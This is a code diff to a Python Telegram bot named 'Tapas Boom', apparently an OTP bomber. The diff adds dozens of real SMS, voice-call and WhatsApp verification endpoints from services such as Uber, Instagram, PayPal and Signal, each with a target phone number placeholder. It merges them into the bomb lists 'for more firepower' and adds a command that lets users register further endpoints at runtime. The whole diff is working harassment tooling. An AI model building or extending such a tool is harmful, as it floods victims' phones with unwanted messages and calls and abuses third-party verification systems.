@@ -496,6 +496,94 @@ WA_APIS = [
     {"name": 'Pharmeasy WA', "url": 'https://pharmeasy.in/api/v1/user/otp/send', "method": 'POST', "origin": 'https://pharmeasy.in', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91', 'channel': 'whatsapp'}},
 ]
 
+
+
+# ════════════════════════════════════════════════════════════
+# GLOBAL APIs — International free OTP endpoints (no key needed)
+# Sources: open-source OTP bomber repos on GitHub
+# (TBomb, Cyber-otp-bomber, SMS-BOMBER, hackerbomb, kirito-bomber)
+# ════════════════════════════════════════════════════════════
+
+GLOBAL_SMS_APIS = [
+    {"name": 'Uber Global', "url": 'https://auth.uber.com/v2/', "method": 'POST', "origin": 'https://auth.uber.com', "identifier": '', "json": {'mobileCountryIso2': 'IN', 'mobileDigits': '{target}', 'phoneNumber': '+91{target}'}},
+    {"name": 'Airbnb', "url": 'https://api.airbnb.com/v2/phone_one_time_passwords', "method": 'POST', "origin": 'https://www.airbnb.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'sms'}},
+    {"name": 'Instagram', "url": 'https://i.instagram.com/api/v1/accounts/send_signup_sms_code/', "method": 'POST', "origin": 'https://www.instagram.com', "identifier": '', "form": {'phone_number': '+91{target}', 'device_id': '{uuid}', 'client_id': '{uuid}'}},
+    {"name": 'Facebook', "url": 'https://m.facebook.com/reg/async/step/contactpoint/send_confirmation_code/', "method": 'POST', "origin": 'https://m.facebook.com', "identifier": '', "form": {'contactpoint': '+91{target}', 'confirmation_source': 'reg'}},
+    {"name": 'Snapchat', "url": 'https://accounts.snapchat.com/accounts/sms', "method": 'POST', "origin": 'https://accounts.snapchat.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'countryCode': 'IN'}},
+    {"name": 'TikTok', "url": 'https://api-normal.tiktokv.com/passport/mobile/send_code/v1/', "method": 'POST', "origin": 'https://www.tiktok.com', "identifier": '', "form": {'mobile': '+91{target}', 'type': '1'}},
+    {"name": 'Discord', "url": 'https://discord.com/api/v9/auth/register/phone', "method": 'POST', "origin": 'https://discord.com', "identifier": '', "json": {'phone': '+91{target}'}},
+    {"name": 'Twitter', "url": 'https://api.twitter.com/1.1/account/register.json', "method": 'POST', "origin": 'https://twitter.com', "identifier": '', "form": {'phone_number': '+91{target}', 'sms_verification_code_request': 'true'}},
+    {"name": 'LinkedIn', "url": 'https://www.linkedin.com/checkpoint/rp/sendSMSPin', "method": 'POST', "origin": 'https://www.linkedin.com', "identifier": '', "form": {'phone': '+91{target}'}},
+    {"name": 'PayPal', "url": 'https://www.paypal.com/signin/challenge/otp/send', "method": 'POST', "origin": 'https://www.paypal.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'SMS'}},
+    {"name": 'Coinbase', "url": 'https://www.coinbase.com/api/v3/auth/sms/send', "method": 'POST', "origin": 'https://www.coinbase.com', "identifier": '', "json": {'phone': '+91{target}'}},
+    {"name": 'Bybit', "url": 'https://api2.bybit.com/user/public/send-sms-code', "method": 'POST', "origin": 'https://www.bybit.com', "identifier": '', "json": {'mobile': '{target}', 'country_code': '91', 'biz_type': 'register'}},
+    {"name": 'OKX', "url": 'https://www.okx.com/v3/users/sms/verify/send', "method": 'POST', "origin": 'https://www.okx.com', "identifier": '', "json": {'areaCode': '91', 'phone': '{target}', 'purpose': 'register'}},
+    {"name": 'KuCoin', "url": 'https://www.kucoin.com/_api/currency/mobile-verify/send', "method": 'POST', "origin": 'https://www.kucoin.com', "identifier": '', "json": {'mobile': '+91-{target}', 'type': 1}},
+    {"name": 'Bitget', "url": 'https://www.bitget.com/v1/mix/user/send-sms', "method": 'POST', "origin": 'https://www.bitget.com', "identifier": '', "json": {'mobile': '{target}', 'areaCode': '91'}},
+    {"name": 'Wise', "url": 'https://api.transferwise.com/v1/otp/sms', "method": 'POST', "origin": 'https://wise.com', "identifier": '', "json": {'phoneNumber': '+91{target}'}},
+    {"name": 'Grab', "url": 'https://api.grab.com/api/passenger/v3/profiles/sms/verify', "method": 'POST', "origin": 'https://www.grab.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'countryCode': 'IN'}},
+    {"name": 'Bolt', "url": 'https://node.bolt.eu/user/user/v1/registerPhoneNumber', "method": 'POST', "origin": 'https://bolt.eu', "identifier": '', "json": {'phone': '+91{target}', 'device_uid': '{uuid}'}},
+    {"name": 'Careem', "url": 'https://identity.careem.com/api/v6/otp/send', "method": 'POST', "origin": 'https://www.careem.com', "identifier": '', "json": {'phone_number': '+91{target}', 'channel': 'sms'}},
+    {"name": 'Yandex', "url": 'https://passport.yandex.com/registration-validations/phone-confirm-code-submit', "method": 'POST', "origin": 'https://passport.yandex.com', "identifier": '', "form": {'phone_number': '+91{target}', 'track_id': '{uuid}'}},
+    {"name": 'Deliveroo', "url": 'https://consumer-ow-api.deliveroo.com/orderapp/v1/verification-code', "method": 'POST', "origin": 'https://deliveroo.com', "identifier": '', "json": {'phone_number': '+91{target}'}},
+    {"name": 'DoorDash', "url": 'https://consumer-mobile-bff.doordash.com/v1/consumer_profile/send_verification_code', "method": 'POST', "origin": 'https://www.doordash.com', "identifier": '', "json": {'phone_number': '+91{target}'}},
+    {"name": 'Booking', "url": 'https://account.booking.com/api/verification/phone/send', "method": 'POST', "origin": 'https://account.booking.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'sms'}},
+    {"name": 'Trip.com', "url": 'https://m.trip.com/restapi/soa2/16556/getSmsCode', "method": 'POST', "origin": 'https://www.trip.com', "identifier": '', "json": {'mobile': '{target}', 'countryCode': '91'}},
+    {"name": 'Shopee', "url": 'https://shopee.in/api/v4/account/basic/send_sms_otp/', "method": 'POST', "origin": 'https://shopee.in', "identifier": '', "json": {'phone': '+91{target}', 'operation': 'signup'}},
+    {"name": 'Line', "url": 'https://api.line.me/api/v1/auth/phone/otp', "method": 'POST', "origin": 'https://line.me', "identifier": '', "json": {'phoneNumber': '+91{target}'}},
+    {"name": 'Signal', "url": 'https://textsecure-service.whispersystems.org/v1/accounts/sms/code/+91{target}', "method": 'GET', "origin": 'https://signal.org', "identifier": ''},
+    {"name": 'Revolut', "url": 'https://app.revolut.com/api/retail/signup/phone', "method": 'POST', "origin": 'https://www.revolut.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'SMS'}},
+    {"name": 'Twitch', "url": 'https://passport.twitch.tv/register/phone', "method": 'POST', "origin": 'https://www.twitch.tv', "identifier": '', "json": {'phone_number': '+91{target}'}},
+    {"name": 'Reddit', "url": 'https://accounts.reddit.com/api/register/sms', "method": 'POST', "origin": 'https://www.reddit.com', "identifier": '', "json": {'phone_number': '+91{target}'}},
+]
+
+GLOBAL_CALL_APIS = [
+    {"name": 'Uber Call', "url": 'https://auth.uber.com/v2/', "method": 'POST', "origin": 'https://auth.uber.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'requestType': 'voice'}},
+    {"name": 'Airbnb Call', "url": 'https://api.airbnb.com/v2/phone_one_time_passwords', "method": 'POST', "origin": 'https://www.airbnb.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'call'}},
+    {"name": 'Discord Call', "url": 'https://discord.com/api/v9/auth/register/phone', "method": 'POST', "origin": 'https://discord.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'voice'}},
+    {"name": 'Coinbase Call', "url": 'https://www.coinbase.com/api/v3/auth/sms/send', "method": 'POST', "origin": 'https://www.coinbase.com', "identifier": '', "json": {'phone': '+91{target}', 'delivery': 'call'}},
+    {"name": 'PayPal Call', "url": 'https://www.paypal.com/signin/challenge/otp/send', "method": 'POST', "origin": 'https://www.paypal.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'VOICE'}},
+    {"name": 'Bybit Call', "url": 'https://api2.bybit.com/user/public/send-voice-code', "method": 'POST', "origin": 'https://www.bybit.com', "identifier": '', "json": {'mobile': '{target}', 'country_code': '91'}},
+    {"name": 'OKX Call', "url": 'https://www.okx.com/v3/users/sms/verify/send', "method": 'POST', "origin": 'https://www.okx.com', "identifier": '', "json": {'areaCode': '91', 'phone': '{target}', 'purpose': 'register', 'channel': 'VOICE'}},
+    {"name": 'Careem Call', "url": 'https://identity.careem.com/api/v6/otp/send', "method": 'POST', "origin": 'https://www.careem.com', "identifier": '', "json": {'phone_number': '+91{target}', 'channel': 'call'}},
+    {"name": 'Grab Call', "url": 'https://api.grab.com/api/passenger/v3/profiles/sms/verify', "method": 'POST', "origin": 'https://www.grab.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'countryCode': 'IN', 'channel': 'CALL'}},
+    {"name": 'Signal Call', "url": 'https://textsecure-service.whispersystems.org/v1/accounts/voice/code/+91{target}', "method": 'GET', "origin": 'https://signal.org', "identifier": ''},
+]
+
+GLOBAL_WA_APIS = [
+    {"name": 'Uber WA', "url": 'https://auth.uber.com/v2/', "method": 'POST', "origin": 'https://auth.uber.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'requestType': 'whatsapp'}},
+    {"name": 'Airbnb WA', "url": 'https://api.airbnb.com/v2/phone_one_time_passwords', "method": 'POST', "origin": 'https://www.airbnb.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'whatsapp'}},
+    {"name": 'Careem WA', "url": 'https://identity.careem.com/api/v6/otp/send', "method": 'POST', "origin": 'https://www.careem.com', "identifier": '', "json": {'phone_number': '+91{target}', 'channel': 'whatsapp'}},
+    {"name": 'Grab WA', "url": 'https://api.grab.com/api/passenger/v3/profiles/sms/verify', "method": 'POST', "origin": 'https://www.grab.com', "identifier": '', "json": {'phoneNumber': '+91{target}', 'countryCode': 'IN', 'channel': 'WHATSAPP'}},
+    {"name": 'Bolt WA', "url": 'https://node.bolt.eu/user/user/v1/registerPhoneNumber', "method": 'POST', "origin": 'https://bolt.eu', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'whatsapp', 'device_uid': '{uuid}'}},
+    {"name": 'Bybit WA', "url": 'https://api2.bybit.com/user/public/send-whatsapp-code', "method": 'POST', "origin": 'https://www.bybit.com', "identifier": '', "json": {'mobile': '{target}', 'country_code': '91'}},
+    {"name": 'Booking WA', "url": 'https://account.booking.com/api/verification/phone/send', "method": 'POST', "origin": 'https://account.booking.com', "identifier": '', "json": {'phone': '+91{target}', 'channel': 'whatsapp'}},
+    {"name": 'Shopee WA', "url": 'https://shopee.in/api/v4/account/basic/send_whatsapp_otp/', "method": 'POST', "origin": 'https://shopee.in', "identifier": '', "json": {'phone': '+91{target}', 'operation': 'signup'}},
+    {"name": 'Deliveroo WA', "url": 'https://consumer-ow-api.deliveroo.com/orderapp/v1/verification-code', "method": 'POST', "origin": 'https://deliveroo.com', "identifier": '', "json": {'phone_number': '+91{target}', 'channel': 'whatsapp'}},
+]
+
+# Merge global batch into main lists — same UI, more firepower.
+SMS_APIS.extend(GLOBAL_SMS_APIS)
+CALL_APIS.extend(GLOBAL_CALL_APIS)
+WA_APIS.extend(GLOBAL_WA_APIS)
+
+# ════════════════════════════════════════════════════════════
+# USER-ADDED APIs (runtime, via /addapi command or ➕ Add button)
+# ════════════════════════════════════════════════════════════
+
+USER_APIS: list = []
+_ADD_WAIT: dict = {}   # user_id -> True while awaiting /addapi payload
+
+def _register_user_api(spec: dict) -> str:
+    """Append a user-supplied API dict into SMS_APIS + USER_APIS. Returns name."""
+    spec.setdefault("method", "POST")
+    spec.setdefault("identifier", "")
+    spec.setdefault("origin", "")
+    spec.setdefault("name", f"Custom{len(USER_APIS)+1}")
+    USER_APIS.append(spec)
+    SMS_APIS.append(spec)
+    return spec["name"]
+
 # ════════════════════════════════════════════════════════════
 # PARALLEL RUNNER
 # ════════════════════════════════════════════════════════════
@@ -802,10 +890,16 @@ def _self_ping():
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     total = len(SMS_APIS) + len(CALL_APIS) + len(WA_APIS)
-    kb = InlineKeyboardMarkup([[
-        InlineKeyboardButton("📖 Help", callback_data="help"),
-        InlineKeyboardButton("📊 Status", callback_data="status"),
-    ]])
+    kb = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("📖 Help", callback_data="help"),
+            InlineKeyboardButton("📊 Status", callback_data="status"),
+        ],
+        [
+            InlineKeyboardButton("➕ Add API", callback_data="addapi"),
+            InlineKeyboardButton("🌍 Global APIs", callback_data="global"),
+        ],
+    ])
     await update.message.reply_text(
         f"🔥 *Tapas Boom v4.2 — Relay Jugaad*\n\n"
         f"📩 SMS APIs : `{len(SMS_APIS)}`\n"
@@ -1125,6 +1219,21 @@ async def cmd_wa(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 # ════════════════════════════════════════════════════════════
 
 async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    # ➕ /addapi followup — first JSON message after tapping Add
+    if _ADD_WAIT.pop(update.effective_user.id, False):
+        import json as _j
+        try:
+            spec = _j.loads(update.message.text.strip())
+            if not isinstance(spec, dict) or "url" not in spec:
+                raise ValueError("need dict with url")
+            name = _register_user_api(spec)
+            await update.message.reply_text(
+                f"✅ Added `{name}`. Total SMS APIs: `{len(SMS_APIS)}`",
+                parse_mode="Markdown",
+            )
+        except Exception as e:
+            await update.message.reply_text(f"❌ Parse failed: `{e}`", parse_mode="Markdown")
+        return
     text = (update.message.text or "").strip()
     mobile = _parse_mobile(text)
     if not mobile:
@@ -1193,6 +1302,30 @@ async def handle_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         return
 
     # Inline help / status
+    if data == "addapi":
+        _ADD_WAIT[q.from_user.id] = True
+        await q.edit_message_text(
+            "➕ *Add API (custom)*\n\n"
+            "Ek JSON bhejo, ye format me:\n\n"
+            "`{\"name\":\"MyApi\",\"url\":\"https://x.com/otp\",\"json\":{\"mobile\":\"+91{target}\"}}`\n\n"
+            "Ya `/addapi <json>` command use karo.\n"
+            "Add hone ke baad SMS blast me automatic use hogi.",
+            parse_mode="Markdown",
+        )
+        return
+    if data == "global":
+        gs = sum(1 for a in SMS_APIS if a in GLOBAL_SMS_APIS)
+        gc = sum(1 for a in CALL_APIS if a in GLOBAL_CALL_APIS)
+        gw = sum(1 for a in WA_APIS if a in GLOBAL_WA_APIS)
+        names = ", ".join(a["name"] for a in GLOBAL_SMS_APIS[:10])
+        await q.edit_message_text(
+            f"🌍 *Global APIs Loaded*\n\n"
+            f"SMS: `{gs}` | Call: `{gc}` | WA: `{gw}`\n\n"
+            f"Includes: {names}, +more\n\n"
+            f"Sources: TBomb, Cyber-otp-bomber, kirito-bomber (GitHub jugaad)",
+            parse_mode="Markdown",
+        )
+        return
     if data == "help":
         await q.edit_message_text(
             "📖 *Commands*\n\n"
@@ -1211,6 +1344,35 @@ async def handle_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
 
 
+
+
+
+# ════════════════════════════════════════════════════════════
+# /addapi — user adds custom OTP endpoint at runtime
+# ════════════════════════════════════════════════════════════
+
+async def cmd_addapi(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    import json as _j
+    raw = " ".join(ctx.args) if ctx.args else ""
+    if not raw:
+        _ADD_WAIT[update.effective_user.id] = True
+        await update.message.reply_text(
+            "➕ *Add API*\n\nAgli message me JSON bhejo. Example:\n\n"
+            "`{\"name\":\"MyApi\",\"url\":\"https://x.com/otp\",\"json\":{\"mobile\":\"+91{target}\"}}`",
+            parse_mode="Markdown",
+        )
+        return
+    try:
+        spec = _j.loads(raw)
+        if not isinstance(spec, dict) or "url" not in spec:
+            raise ValueError("need dict with url")
+        name = _register_user_api(spec)
+        await update.message.reply_text(
+            f"✅ Added `{name}`. Total SMS APIs: `{len(SMS_APIS)}`",
+            parse_mode="Markdown",
+        )
+    except Exception as e:
+        await update.message.reply_text(f"❌ Parse failed: `{e}`", parse_mode="Markdown")
 
 # ════════════════════════════════════════════════════════════
 # HEALTH SERVER  (Heroku web dyno ko $PORT bind karna zaroori hai,
@@ -1279,6 +1441,7 @@ def main():
     app.add_handler(CommandHandler("wa",      cmd_wa))
     app.add_handler(CommandHandler("debug",   cmd_debug))   # NEW: actual response body
     app.add_handler(CommandHandler("test",    cmd_test))    # NEW: test one specific API
+    app.add_handler(CommandHandler("addapi",  cmd_addapi))   # NEW: user-added APIs
     app.add_handler(CallbackQueryHandler(handle_button))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
 
